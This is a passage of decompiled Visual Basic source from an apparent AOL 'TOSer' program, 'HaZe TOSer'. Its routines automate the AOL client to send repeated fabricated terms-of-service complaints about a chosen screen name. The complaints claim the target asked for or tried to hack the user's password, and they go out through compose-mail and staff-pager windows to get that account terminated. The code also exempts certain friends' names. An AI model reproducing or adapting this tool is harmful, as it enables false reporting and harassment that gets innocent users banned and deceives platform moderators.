l14E0 = extfn1718(l14C4, c07E6, 0, "40-22620")
subF38 .3#
l14E4 = extfn24E0(l13CC%, "Invoke Database Record")
l14E8 = extfn2518(l14E4, "_AOL_Button")
l14EC = extfn24E0(l14E8, "OK")
subF38 .5#
l14F0 = extfn1750(l14E8, c0074, 0, 0&)
l14F0 = extfn1750(l14E8, c007C, 0, 0&)
subF38 .1#
l14F4% = extfn24E0(l13CC%, "INVOKE DATABASE RECORD")
l13EC = extfn1750(l14F4%, c022E, 0, 0)
subF38 .9#
Do
DoEvents
l14F6% = extfn24E0(l13CC%, "GUIDEPAGER FOR STAFF MEMBERS")
Loop Until l14F6% > 0
l14F8 = extfn24E0(l13CC%, "guidepager for staff members")
l14FC = fn5D0(l14B2(), l14F8, "*", "_AOL_Icon", Null)
l1500 = l14B2(3)
l14D0 = extfn1750(l1500, c0074, 0, 0&)
l14D4 = extfn1750(l1500, c007C, 0, 0&)
subF38 .1#
l13EA% = extfn24E0(l13CC%, "GUIDEPAGER FOR STAFF MEMBERS")
l13EC = extfn1750(l13EA%, c022E, 0, 0)
DoEvents
l1506% = extfn1750(l1504%, c0074, 0, 0&)
l1506% = extfn1750(l1504%, c007C, 0, 0&)
subF38 .1#
Do
DoEvents
l1508% = extfn24E0(l13CC%, "Report Password Solicitations")
Loop Until l1508% > 0
subF38 .1#
l13EA% = extfn24E0(l13CC%, "GUIDEPAGER FOR STAFF MEMBERS")
l13EC = extfn1750(l13EA%, c022E, 0, 0)
l13F8 = extfn2518(l13CC%, "_AOL_edit")
l13FC = extfn14E8(l13F8, c0810)
l1400 = extfn14E8(l13FC, c0810)
l1404 = extfn14E8(l1400, c0810)
l1408 = extfn14E8(l1404, c0810)
l140C = extfn14E8(l1408, c0810)
l1410 = extfn14E8(l140C, c0810)
l1414 = extfn14E8(l1410, c0810)
l1418 = extfn14E8(l1414, c0810)
l141C = extfn1718(l1410, c07E6, 0, Room)
l1420$ = Chr(10)
l141C = extfn1718(l1418, c07E6, 0, Room + ":" & " " & "" & Text1 & l1420$ & l1420$)
subF38 .3#
l13DA = extfn16E0(l1410, c0218, 13, 0)
subF38 .7#
subFE0
sub30B0 "•-^v•HaZe-X²·³ [gold] • Staffpager Completed."
subF38 .3#
sub30B0 "•-^v•HaZe-X²·³ [gold] • Supreme TOS Completed."
Call sub3208
For l150A = 0 To Combo1.ListCount
l150E$ = Combo1.List(l150A)
If  Room = l150E$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub TOSChat1_Click ()
Dim l1510 As Variant
Dim l1514 As Variant
Dim l1518 As Variant
Dim l151C As String
Dim l151E As Variant
Dim l1522() As Integer
Dim l1528 As Integer
Dim l152A As Variant
Dim l152E As Variant
Dim l1532 As String
Dim l1534 As Variant
Dim l1538 As Variant
Dim l153C As Variant
Dim l1540 As Variant
Dim l1544 As Variant
Dim l1548 As Variant
Dim l154C As Variant
Dim l1550 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l1510 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l1514 = 6
    l1518 = Int(Rnd * l1514 + 1)
      If  l1518 = 1 Then l151C$ = "" & Form1.Room & " asked for my password."
      If  l1518 = 2 Then l151C$ = "" & Form1.Room & " tried to hack my password."
      If  l1518 = 3 Then l151C$ = "Read!" & Form1.Room & " asked for my password."
      If  l1518 = 4 Then l151C$ = "Please do something about " & Form1.Room & "."
      If  l1518 = 5 Then l151C$ = "This guy wants my password:" & Form1.Room
      If  l1518 = 6 Then l151C$ = "Please help " & Form1.Room & " wants my password."
      If  l1518 = 7 Then l151C$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l151E) Like "*KaOS*" Or UCase$(l151E) Like "*NiPP*" Or UCase$(l151E) Like "*CHOP*" Or UCase$(l151E) Like "*LoRe*" Or UCase$(l151E) Like "*CouNT*" Or UCase$(l151E) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSChat"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l1528% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l152A = extfn24E0(l1528%, "Compose Mail")
DoEvents
Loop Until l152A <> 0
l152E = fn5D0(l1522(), l152A, "*", "_AOL_Edit", Null)
subF00 l1522(1), "TOSChat"
subF00 l1522(3), "" & l151C$
l1532$ = Chr(10) + Chr(3)
subF00 l1522(4), "" & Room & ":" & " " & "" & Text1 & l1532$ & l1532$
l1534 = extfn24E0(l152A, "Send")
l1538 = extfn2518(l152A, "_AOL_Icon")
l153C = extfn13D0(l1538, 2)
l1540 = extfn13D0(l153C, 2)
l1544 = extfn1750(l1538, c0074, 0, 0&)
l1548 = extfn1750(l1538, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l154C = 0 To Combo1.ListCount
l1550$ = Combo1.List(l154C)
If  Room = l1550$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub Toskids_Click ()
Dim l1552 As Variant
Dim l1556 As Variant
Dim l155A As Variant
Dim l155E As String
Dim l1560 As Variant
Dim l1564() As Integer
Dim l156A As Integer
Dim l156C As Variant
Dim l1570 As Variant
Dim l1574 As Variant
Dim l1578 As String
Dim l157A As Variant
Dim l157E As Variant
Dim l1582 As Variant
Dim l1586 As Variant
Dim l158A As Variant
Dim l158E As Variant
Dim l1592 As Variant
Dim l1596 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l1552 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l1556 = 6
    l155A = Int(Rnd * l1556 + 1)
      If  l155A = 1 Then l155E$ = "" & Form1.Room & " asked for my password."
      If  l155A = 2 Then l155E$ = "" & Form1.Room & " tried to hack my password."
      If  l155A = 3 Then l155E$ = "Read!" & Form1.Room & " asked for my password."
      If  l155A = 4 Then l155E$ = "Please do something about " & Form1.Room & "."
      If  l155A = 5 Then l155E$ = "This guy wants my password:" & Form1.Room
      If  l155A = 6 Then l155E$ = "Please help " & Form1.Room & " wants my password."
      If  l155A = 7 Then l155E$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l1560) Like "*KaOS*" Or UCase$(l1560) Like "*NiPP*" Or UCase$(l1560) Like "*CHOP*" Or UCase$(l1560) Like "*LoRe*" Or UCase$(l1560) Like "*CouNT*" Or UCase$(l1560) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSKids1"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l156A% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l156C = extfn24E0(l156A%, "Compose Mail")
DoEvents
Loop Until l156C <> 0
l1570 = fn5D0(l1564(), l156C, "*", "_AOL_Edit", Null)
subF00 l1564(1), "TOS Kids"
subF00 l1564(3), "" & l155E$
l1574 = Chr(9) + Chr(13)
subF00 l1564(4), "" & Room & ":" & " " & "" & Text1 & l1574 & l1578$
l157A = extfn24E0(l156C, "Send")
l157E = extfn2518(l156C, "_AOL_Icon")
l1582 = extfn13D0(l157E, 2)
l1586 = extfn13D0(l1582, 2)
l158A = extfn1750(l157E, c0074, 0, 0&)
l158E = extfn1750(l157E, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l1592 = 0 To Combo1.ListCount
l1596$ = Combo1.List(l1592)
If  Room = l1596$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub tospro_Click ()
Dim l1598 As Variant
Dim l159C As Variant
Dim l15A0 As Variant
Dim l15A4 As String
Dim l15A6 As Variant
Dim l15AA() As Integer
Dim l15B0 As Integer
Dim l15B2 As Variant
Dim l15B6 As Variant
Dim l15BA As String
Dim l15BC As Variant
Dim l15C0 As Variant
Dim l15C4 As Variant
Dim l15C8 As Variant
Dim l15CC As Variant
Dim l15D0 As Variant
Dim l15D4 As Variant
Dim l15D8 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l1598 = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l159C = 6
    l15A0 = Int(Rnd * l159C + 1)
      If  l15A0 = 1 Then l15A4$ = "" & Form1.Room & " asked for my password."
      If  l15A0 = 2 Then l15A4$ = "" & Form1.Room & " tried to hack my password."
      If  l15A0 = 3 Then l15A4$ = "Read!" & Form1.Room & " asked for my password."
      If  l15A0 = 4 Then l15A4$ = "Please do something about " & Form1.Room & "."
      If  l15A0 = 5 Then l15A4$ = "This guy wants my password:" & Form1.Room
      If  l15A0 = 6 Then l15A4$ = "Please help " & Form1.Room & " wants my password."
      If  l15A0 = 7 Then l15A4$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l15A6) Like "*KaOS*" Or UCase$(l15A6) Like "*NiPP*" Or UCase$(l15A6) Like "*CHOP*" Or UCase$(l15A6) Like "*LoRe*" Or UCase$(l15A6) Like "*CouNT*" Or UCase$(l15A6) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSProfile"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l15B0% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l15B2 = extfn24E0(l15B0%, "Compose Mail")
DoEvents
Loop Until l15B2 <> 0
l15B6 = fn5D0(l15AA(), l15B2, "*", "_AOL_Edit", Null)
subF00 l15AA(1), "TOSProfile"
subF00 l15AA(3), "" & l15A4$
l15BA$ = Chr(10) + Chr(3)
subF00 l15AA(4), "" & Room & ":" & " " & "" & Text1 & l15BA$ & l15BA$
l15BC = extfn24E0(l15B2, "Send")
l15C0 = extfn2518(l15B2, "_AOL_Icon")
l15C4 = extfn13D0(l15C0, 2)
l15C8 = extfn13D0(l15C4, 2)
l15CC = extfn1750(l15C0, c0074, 0, 0&)
l15D0 = extfn1750(l15C0, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l15D4 = 0 To Combo1.ListCount
l15D8$ = Combo1.List(l15D4)
If  Room = l15D8$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub TROUBLE_Click ()
Dim l15DA As Variant
Dim l15DE As Variant
Dim l15E2 As Variant
Dim l15E6 As String
Dim l15E8 As Variant
Dim l15EC() As Integer
Dim l15F2 As Integer
Dim l15F4 As Variant
Dim l15F8 As Variant
Dim l15FC As String
Dim l15FE As Variant
Dim l1602 As Variant
Dim l1606 As Variant
Dim l160A As Variant
Dim l160E As Variant
Dim l1612 As Variant
Dim l1616 As Variant
Dim l161A As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l15DA = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l15DE = 6
    l15E2 = Int(Rnd * l15DE + 1)
      If  l15E2 = 1 Then l15E6$ = "" & Form1.Room & " asked for my password."
      If  l15E2 = 2 Then l15E6$ = "" & Form1.Room & " tried to hack my password."
      If  l15E2 = 3 Then l15E6$ = "Read!" & Form1.Room & " asked for my password."
      If  l15E2 = 4 Then l15E6$ = "Please do something about " & Form1.Room & "."
      If  l15E2 = 5 Then l15E6$ = "This guy wants my password:" & Form1.Room
      If  l15E2 = 6 Then l15E6$ = "Please help " & Form1.Room & " wants my password."
      If  l15E2 = 7 Then l15E6$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l15E8) Like "*KaOS*" Or UCase$(l15E8) Like "*NiPP*" Or UCase$(l15E8) Like "*CHOP*" Or UCase$(l15E8) Like "*LoRe*" Or UCase$(l15E8) Like "*CouNT*" Or UCase$(l15E8) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TROUBLE"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l15F2% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l15F4 = extfn24E0(l15F2%, "Compose Mail")
DoEvents
Loop Until l15F4 <> 0
l15F8 = fn5D0(l15EC(), l15F4, "*", "_AOL_Edit", Null)
subF00 l15EC(1), "TROUBLE"
subF00 l15EC(3), "" & l15E6$
l15FC$ = Chr(10) + Chr(3)
subF00 l15EC(4), "" & Room & ":" & " " & "" & Text1 & l15FC$ & l15FC$
l15FE = extfn24E0(l15F4, "Send")
l1602 = extfn2518(l15F4, "_AOL_Icon")
l1606 = extfn13D0(l1602, 2)
l160A = extfn13D0(l1606, 2)
l160E = extfn1750(l1602, c0074, 0, 0&)
l1612 = extfn1750(l1602, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l1616 = 0 To Combo1.ListCount
l161A$ = Combo1.List(l1616)
If  Room = l161A$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub tttt_Click ()
Dim l161C As Variant
Dim l1620 As Variant
Dim l1624 As Variant
Dim l1628 As String
Dim l162A As Variant
Dim l162E() As Integer
Dim l1634 As Integer
Dim l1636 As Variant
Dim l163A As Variant
Dim l163E As String
Dim l1640 As Variant
Dim l1644 As Variant
Dim l1648 As Variant
Dim l164C As Variant
Dim l1650 As Variant
Dim l1654 As Variant
Dim l1658 As Variant
Dim l165C As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l161C = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l1620 = 6
    l1624 = Int(Rnd * l1620 + 1)
      If  l1624 = 1 Then l1628$ = "" & Form1.Room & " asked for my password."
      If  l1624 = 2 Then l1628$ = "" & Form1.Room & " tried to hack my password."
      If  l1624 = 3 Then l1628$ = "Read!" & Form1.Room & " asked for my password."
      If  l1624 = 4 Then l1628$ = "Please do something about " & Form1.Room & "."
      If  l1624 = 5 Then l1628$ = "This guy wants my password:" & Form1.Room
      If  l1624 = 6 Then l1628$ = "Please help " & Form1.Room & " wants my password."
      If  l1624 = 7 Then l1628$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l162A) Like "*KaOS*" Or UCase$(l162A) Like "*NiPP*" Or UCase$(l162A) Like "*CHOP*" Or UCase$(l162A) Like "*LoRe*" Or UCase$(l162A) Like "*CouNT*" Or UCase$(l162A) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • TOSFileWrn"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l1634% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1636 = extfn24E0(l1634%, "Compose Mail")
DoEvents
Loop Until l1636 <> 0
l163A = fn5D0(l162E(), l1636, "*", "_AOL_Edit", Null)
subF00 l162E(1), "TOSFileWrn"
subF00 l162E(3), "" & l1628$
l163E$ = Chr(10) + Chr(3)
subF00 l162E(4), "" & Room & ":" & " " & "" & Text1 & l163E$ & l163E$
l1640 = extfn24E0(l1636, "Send")
l1644 = extfn2518(l1636, "_AOL_Icon")
l1648 = extfn13D0(l1644, 2)
l164C = extfn13D0(l1648, 2)
l1650 = extfn1750(l1644, c0074, 0, 0&)
l1654 = extfn1750(l1644, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l1658 = 0 To Combo1.ListCount
l165C$ = Combo1.List(l1658)
If  Room = l165C$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub sub4A28 ()
Do
Call sub3398("¤| HaZeTOSer|¤")
Call sub3398("¤|r HaZeTOSe|¤")
Call sub3398("¤|er HaZeTOS|¤")
Call sub3398("¤|Ser HaZeTO|¤")
Call sub3398("¤|OSer HaZeT|¤")
Call sub3398("¤|TOSer HaZe|¤")
Call sub3398("¤|eTOSer HaZ|¤")
Call sub3398("¤|ZeTOSer Ha|¤")
Call sub3398("¤|aZeTOSer H|¤")
Call sub3398("¤|HaZeTOSer |¤")
Text2 = Text2 + 1
Loop Until Text2 = 9
Text2 = "0"
Exit Sub
End Sub

Sub vla_Click ()
Dim l165E As Variant
Dim l1662 As Variant
Dim l1666 As Variant
Dim l166A As String
Dim l166C As Variant
Dim l1670() As Integer
Dim l1676 As Integer
Dim l1678 As Variant
Dim l167C As Variant
Dim l1680 As String
Dim l1682 As Variant
Dim l1686 As Variant
Dim l168A As Variant
Dim l168E As Variant
Dim l1692 As Variant
Dim l1696 As Variant
Dim l169A As Variant
Dim l169E As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
Randomize
For l165E = 0 To Int(Rnd * 10) + Int(Rnd * 10)
    l1662 = 6
    l1666 = Int(Rnd * l1662 + 1)
      If  l1666 = 1 Then l166A$ = "" & Form1.Room & " asked for my password."
      If  l1666 = 2 Then l166A$ = "" & Form1.Room & " tried to hack my password."
      If  l1666 = 3 Then l166A$ = "Read!" & Form1.Room & " asked for my password."
      If  l1666 = 4 Then l166A$ = "Please do something about " & Form1.Room & "."
      If  l1666 = 5 Then l166A$ = "This guy wants my password:" & Form1.Room
      If  l1666 = 6 Then l166A$ = "Please help " & Form1.Room & " wants my password."
      If  l1666 = 7 Then l166A$ = "Can you do something about " & Form1.Room & "?"
      Next
If  UCase$(l166C) Like "*KaOS*" Or UCase$(l166C) Like "*NiPP*" Or UCase$(l166C) Like "*CHOP*" Or UCase$(l166C) Like "*LoRe*" Or UCase$(l166C) Like "*CouNT*" Or UCase$(l166C) Like "*SoSo*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • VLA"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l1676% = extfn1520("AOL Frame25", 0&)
Call subD08("&Compose Mail", "&Mail")
Do
DoEvents
l1678 = extfn24E0(l1676%, "Compose Mail")
DoEvents
Loop Until l1678 <> 0
l167C = fn5D0(l1670(), l1678, "*", "_AOL_Edit", Null)
subF00 l1670(1), "VLA"
subF00 l1670(3), "" & l166A$
l1680$ = Chr(10) + Chr(3)
subF00 l1670(4), "" & Room & ":" & " " & "" & Text1 & l1680$ & l1680$
l1682 = extfn24E0(l1678, "Send")
l1686 = extfn2518(l1678, "_AOL_Icon")
l168A = extfn13D0(l1686, 2)
l168E = extfn13D0(l168A, 2)
l1692 = extfn1750(l1686, c0074, 0, 0&)
l1696 = extfn1750(l1686, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l169A = 0 To Combo1.ListCount
l169E$ = Combo1.List(l169A)
If  Room = l169E$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub
